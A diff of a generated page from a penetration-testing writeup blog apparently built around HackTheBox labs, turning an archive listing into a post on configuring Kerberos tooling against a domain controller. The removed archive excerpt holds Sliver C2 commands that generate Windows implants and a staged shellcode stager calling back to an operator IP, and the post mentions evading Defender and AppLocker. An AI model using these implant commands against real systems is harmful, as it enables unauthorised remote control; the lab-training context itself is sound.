@@ -5,34 +5,32 @@
       
       
       
-        <link rel="canonical" href="https://syanide-.github.io/writeups/blog/archive/2025/">
+        <link rel="canonical" href="https://syanide-.github.io/writeups/blog/2025/11/13/how-i-operate-within-a-kerberos-realm/">
       
       
-        <link rel="prev" href="../../">
       
-      
-        <link rel="next" href="../../../writeups/HackTheBox/Machines/Breach/">
+        <link rel="next" href="../../18/sliver-c2/">
       
       
         
       
       
-        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml">
-        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../../feed_rss_updated.xml">
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
     
     
       
-        <title>2025 - SYANiDE-.github.io writeups</title>
+        <title>How I operate within a Kerberos Realm - SYANiDE-.github.io writeups</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.618322db.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -51,21 +49,21 @@
       
     
     
-      <link rel="stylesheet" href="../../../css/app.css">
+      <link rel="stylesheet" href="../../../../../css/app.css">
     
-      <link rel="stylesheet" href="../../../css/terminal-player.css">
+      <link rel="stylesheet" href="../../../../../css/terminal-player.css">
     
-      <link rel="stylesheet" href="../../../css/asciinema-player.css">
+      <link rel="stylesheet" href="../../../../../css/asciinema-player.css">
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/panzoom.css">
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/panzoom.css">
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
     
     
-  <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+  <link href="../../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
             html.glightbox-open { overflow: initial; height: 100%; }
             .gslide-title { margin-top: 0px; user-select: text; }
             .gslide-desc { color: #666; user-select: text; }
@@ -95,7 +93,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#2025" class="md-skip">
+        <a href="#how-i-operate-within-a-kerberos-realm" class="md-skip">
           Skip to content
         </a>
       
@@ -111,7 +109,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="SYANiDE-.github.io writeups" class="md-header__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
+    <a href="../../../../.." title="SYANiDE-.github.io writeups" class="md-header__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
@@ -131,7 +129,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              2025
+              How I operate within a Kerberos Realm
             
           </span>
         </div>
@@ -229,7 +227,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../.." class="md-tabs__link">
+      <a href="../../../../.." class="md-tabs__link">
         
   
   
@@ -252,7 +250,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../" class="md-tabs__link">
+        <a href="../../../../" class="md-tabs__link">
           
   
   
@@ -288,7 +286,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../writeups/HackTheBox/Machines/Breach/" class="md-tabs__link">
+        <a href="../../../../../writeups/HackTheBox/Machines/Breach/" class="md-tabs__link">
           
   
   
@@ -325,7 +323,9 @@
           
             
               
-              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
                 <div class="md-sidebar__scrollwrap">
                   <div class="md-sidebar__inner">
                     
@@ -338,7 +338,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="SYANiDE-.github.io writeups" class="md-nav__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
+    <a href="../../../../.." title="SYANiDE-.github.io writeups" class="md-nav__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
@@ -356,7 +356,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../../../../.." class="md-nav__link">
         
   
   
@@ -413,7 +413,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../" class="md-nav__link ">
+            <a href="../../../../" class="md-nav__link ">
               
   
   
@@ -454,33 +454,33 @@
                 
   
   
+  
+  
     
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
   
   
   
-    
-    
+    <a href="../../../../archive/2025/" class="md-nav__link">
       
-        
-      
-    
-    
-    
-      
-      
-    
-    
-      
-    
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
-        
-          
-          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
-            
   
   
   <span class="md-ellipsis">
@@ -494,64 +494,12 @@
   
   
 
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
-          <label class="md-nav__title" for="__nav_2_2">
-            <span class="md-nav__icon md-icon"></span>
-            
-  
-    Archive
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
   
 
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-    
-  
-  
-    
-      
-    
-  
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    2025
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-      
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
       
     </li>
   
@@ -602,7 +550,7 @@
   
   
   
-    <a href="../../../writeups/HackTheBox/Machines/Breach/" class="md-nav__link">
+    <a href="../../../../../writeups/HackTheBox/Machines/Breach/" class="md-nav__link">
       
   
   
@@ -641,104 +589,134 @@
             
           
           
-  <div class="md-content" data-md-component="content">
-    <div class="md-content__inner">
-      <header class="md-typeset">
-        <h1 id="2025">2025<a class="headerlink" href="#2025" title="Permanent link">¶</a></h1>
-      </header>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2025-11-18 00:00:00+00:00">November 18, 2025</time></li>
-        
-        
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../../../../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"></path></svg>
+                        <time datetime="2025-11-13 00:00:00+00:00" class="md-ellipsis">November 13, 2025</time>
+                      </div>
+                    </li>
+                    
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"></path></svg>
+                          <span class="md-ellipsis">
+                            
+                              4 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
           
-          <li class="md-meta__item">
             
-              3 min read
-            
-          </li>
-        
-        
-      </ul>
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="sliver-c2"><a class="toclink" href="../../2025/11/18/sliver-c2/">Sliver C2</a></h2>
-<p>I use both <code>sliver-server</code> and <code>sliver-client</code>.  This way if a connection bugs out on me or accidentally blocks waiting for <code>stdin</code>, I can just nuke the borked instance of <code>sliver-client</code> and start a new one.   Plus I can have multiple instances of <code>multiplayer</code>ed <code>sliver-client</code> teaming on the same session.</p>
-<p>The way I like to use <code>sliver</code> is mainly sessions. If I'm working in shellcode, I have a number of delivery mechanisms, but I tend to gravitate toward staged payloads.</p>
-<p>I document here generally how I stand up <code>sliver</code>, as reference for writeups, rather than have to verbosely document in every writeup involving an engagement where I do use <code>sliver</code>.</p>
-<h3 id="getting-set-up"><a class="toclink" href="../../2025/11/18/sliver-c2/#getting-set-up">Getting set up</a></h3>
-<p>Start a <code>sliver-server</code> instance, and enable <code>multiplayer</code> so <code>sliver-client</code> instances can connect to it.</p>
-<div class="highlight"><pre><span></span><code>sliver-server
-multiplayer
-</code></pre></div>
-<p><img alt="Pasted_image_20251118215603.png" src="../../../Pasted_image_20251118215603.png"></p>
-<p>Need to generate an <code>operator</code> profile, this is a profile that will be imported by <code>sliver-client</code> that tells it how to connect to <code>sliver-server</code>.</p>
-<div class="highlight"><pre><span></span><code>[server] sliver &gt; new-operator --lhost 10.10.16.59 --save duff59 --name duff59
-</code></pre></div>
-<p><img alt="Pasted_image_20251118215817.png" src="../../../Pasted_image_20251118215817.png"></p>
-<p>Right about now, import the profile into <code>sliver-client</code> and connect</p>
-<div class="highlight"><pre><span></span><code>sliver-client import duff59
-sliver-client
-(select 10.10.16.59)
-</code></pre></div>
-<p><img alt="Pasted_image_20251118221343.png" src="../../../Pasted_image_20251118221343.png"></p>
-<h3 id="a-windows-implant-example"><a class="toclink" href="../../2025/11/18/sliver-c2/#a-windows-implant-example">A Windows implant example</a></h3>
-<p>A maybe basic example might be to create an implant that can be dropped on-host.  I am preferential to the <code>mtls</code> variety of listener, so I will stand up an <code>mtls</code> listener and generate a new implant.  By default the <code>mtls</code> listener will listen on port <code>8888</code>.</p>
-<div class="highlight"><pre><span></span><code>sliver &gt; mtls --timeout 240
-sliver &gt; generate --skip-symbols --disable-sgn --timeout 240 --mtls 10.10.16.59:8888 --arch amd64 --os windows --reconnect 60 --format exe --save a.exe
-</code></pre></div>
-<p><img alt="Pasted_image_20251118223227.png" src="../../../Pasted_image_20251118223227.png"></p>
-<h3 id="a-windows-staged-implant-example"><a class="toclink" href="../../2025/11/18/sliver-c2/#a-windows-staged-implant-example">A Windows staged implant example</a></h3>
-<p>With a staged implant, the name of the game is shellcode.  So I define a profile for the second stage.  I assign the profile a name like <code>duff59</code></p>
-<div class="highlight"><pre><span></span><code>sliver &gt; profiles new --mtls 10.10.16.59 --os windows --arch amd64 --skip-symbols --format shellcode duff59
-</code></pre></div>
-<p><img alt="Pasted_image_20251118224031.png" src="../../../Pasted_image_20251118224031.png"></p>
-<p>I would still need a listener for second stage to connect to, again I like to use <code>mtls</code>.  This setup also requires having a <code>stage listener</code>, which the first stage will connect to to retrieve the second stage.  The <code>stage listener</code> will listen on port <code>8443</code> in this example</p>
-<div class="highlight"><pre><span></span><code>sliver &gt; mtls --timeout 240
-sliver &gt; stage-listener --url tcp://10.10.16.59:8443 --profile duff59
-</code></pre></div>
-<p><img alt="Pasted_image_20251118224628.png" src="../../../Pasted_image_20251118224628.png"></p>
-<p>Finally, generate the first-stage shellcode.  I like to use my own encryption helpers and decryption stubs, depending on the delivery method.</p>
-<div class="highlight"><pre><span></span><code>sliver &gt; generate stager --lhost 10.10.16.59 --lport 8443 --os windows --arch amd64 --timeout 240 --format raw --save b.bin
-</code></pre></div>
-<p><img alt="Pasted_image_20251118225545.png" src="../../../Pasted_image_20251118225545.png"></p>
-<h3 id="staged-linux-implant"><a class="toclink" href="../../2025/11/18/sliver-c2/#staged-linux-implant">Staged Linux implant</a></h3>
-<p>A staged implant for Linux is basically the same thing, only the <code>--os</code> would be <code>linux</code>.</p>
-    
-    
-  </div>
-</article>
+        <li class="md-nav__item">
+  <a href="#etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
       
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2025-11-13 00:00:00+00:00">November 13, 2025</time></li>
-        
-        
+        /etc/hosts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#etcresolvconf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        /etc/resolv.conf
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#etckrb5conf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        /etc/krb5.conf
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timesync-with-a-dc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        timesync with a DC
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
           
-          <li class="md-meta__item">
-            
-              4 min read
-            
-          </li>
-        
-        
-      </ul>
-      
+        </div>
+      </div>
     </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="how-i-operate-within-a-kerberos-realm"><a class="toclink" href="../../2025/11/13/how-i-operate-within-a-kerberos-realm/">How I operate within a Kerberos Realm</a></h2>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+<h1 id="how-i-operate-within-a-kerberos-realm">How I operate within a Kerberos Realm<a class="headerlink" href="#how-i-operate-within-a-kerberos-realm" title="Permanent link">¶</a></h1>
 <p>When I am working in a Kerberos realm, there are a few things I do as a collection of standard procedure on any given engagement.</p>
 <ol>
 <li><code>/etc/hosts</code>: Add hostname mappings to IPs, and for DCs, explode every component of the DCs FQDN and associate it to the IP of the domain controller</li>
@@ -755,18 +733,18 @@ sliver &gt; stage-listener --url tcp://10.10.16.59:8443 --profile duff59
 <li>many, many others</li>
 </ul>
 <p>There are many advantages to working from a primarily <code>linux</code>-based workflow, such as avoiding dropping files on disk (i.e., <code>mimikatz</code>, <code>rubeus.exe</code>,<code>certify</code> etc.), avoiding <code>applocker</code> policies or <code>Defender</code>, wonky shells, etc.  </p>
-<h3 id="etchosts"><a class="toclink" href="../../2025/11/13/how-i-operate-within-a-kerberos-realm/#etchosts">/etc/hosts</a></h3>
+<h2 id="etchosts">/etc/hosts<a class="headerlink" href="#etchosts" title="Permanent link">¶</a></h2>
 <p>Host entries in <code>/etc/hosts</code> should follow a pattern of most-descriptive to least-descriptive.  For example, a domain controller that serves as KDC for the realm would have a host entry like follows:</p>
 <div class="highlight"><pre><span></span><code>10.1.2.3 dc1.example.com example.com example dc1
 </code></pre></div>
 <p>Some tools and some protocols may only send part or all of the FQDN, an entry like above ensures that no matter the format of the request, the IP is the one that handles the request for that realm.</p>
-<h3 id="etcresolvconf"><a class="toclink" href="../../2025/11/13/how-i-operate-within-a-kerberos-realm/#etcresolvconf">/etc/resolv.conf</a></h3>
+<h2 id="etcresolvconf">/etc/resolv.conf<a class="headerlink" href="#etcresolvconf" title="Permanent link">¶</a></h2>
 <p>Consult the <a href="https://man7.org/linux/man-pages/man5/resolv.conf.5.html">manpage</a> or, a slightly more humanized conversation around <a href="https://www.baeldung.com/linux/etc-resolv-conf-file">resolv.conf usage</a></p>
 <p>But two entries I like to use as a baseline are the <code>nameserver</code> and <code>search</code> configuration options, and typically I will make these entries the topmost entries above all others so that they are preferred:</p>
 <div class="highlight"><pre><span></span><code>search example.com
 nameserver 10.1.2.3
 </code></pre></div>
-<h3 id="etckrb5conf"><a class="toclink" href="../../2025/11/13/how-i-operate-within-a-kerberos-realm/#etckrb5conf">/etc/krb5.conf</a></h3>
+<h2 id="etckrb5conf">/etc/krb5.conf<a class="headerlink" href="#etckrb5conf" title="Permanent link">¶</a></h2>
 <p>I have a <a href="https://github.com/SYANiDE-/make_krb5.conf">utility I wrote</a> for quickly building out the <code>/etc/krb5.conf</code>.  Automate the boring they say. </p>
 <p>The <code>-d</code> option can take a comma-delimited list of DC FQDNs, which is useful in cases where you need your <code>krb5.conf</code> to handle multiple realms.  The first DC specified in the list will be the default realm.</p>
 <p>Example:</p>
@@ -821,7 +799,7 @@ default = FILE:/var/log/krb5_default.log
 
 [+] Writing /etc/krb5.conf
 </code></pre></div>
-<h3 id="timesync-with-a-dc"><a class="toclink" href="../../2025/11/13/how-i-operate-within-a-kerberos-realm/#timesync-with-a-dc">timesync with a DC</a></h3>
+<h2 id="timesync-with-a-dc">timesync with a DC<a class="headerlink" href="#timesync-with-a-dc" title="Permanent link">¶</a></h2>
 <p>Anyone that has ever tried to authenticate to a DC using Kerberos, and the DC is in a different time zone, knows of the pain and struggle:</p>
 <p>Example:</p>
 <div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/hercules<span class="o">]</span>
@@ -851,23 +829,54 @@ sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </
 <span class="c1">## recouple</span>
 sudo<span class="w"> </span>systemctl<span class="w"> </span>stop<span class="w"> </span>vbox-disable-timesync.service
 </code></pre></div>
-    
-    
-  </div>
-</article>
-      
-      
-        
-          
 
 
 
-<nav class="md-pagination">
+
+
+
+
   
-</nav>
-        
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
       
-    </div>
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 19, 2025 08:42:10 UTC">November 19, 2025</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"></path></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="November 14, 2025 05:15:38 UTC">November 14, 2025</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+  
+
+
+
+      
+    </article>
   </div>
 
           
@@ -949,12 +958,12 @@ sudo<span class="w"> </span>systemctl<span class="w"> </span>stop<span class="w"
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "toc.follow", "toc.integrate", "navigation.top", "header.autohide", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "toc.follow", "toc.integrate", "navigation.top", "header.autohide", "search.highlight", "search.share"], "search": "../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      <script src="../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
       
-        <script src="../../../javascripts/mathjax.js"></script>
+        <script src="../../../../../javascripts/mathjax.js"></script>
       
         <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
       
@@ -962,13 +971,13 @@ sudo<span class="w"> </span>systemctl<span class="w"> </span>stop<span class="w"
       
         <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
       
-        <script src="../../../javascripts/app.js"></script>
+        <script src="../../../../../javascripts/app.js"></script>
       
-        <script src="../../../js/asciinema-player.min.js"></script>
+        <script src="../../../../../js/asciinema-player.min.js"></script>
       
-        <script src="../../../assets/javascripts/panzoom.min.js"></script>
+        <script src="../../../../../assets/javascripts/panzoom.min.js"></script>
       
-        <script src="../../../assets/javascripts/zoompan.js"></script>
+        <script src="../../../../../assets/javascripts/zoompan.js"></script>
       
     
   
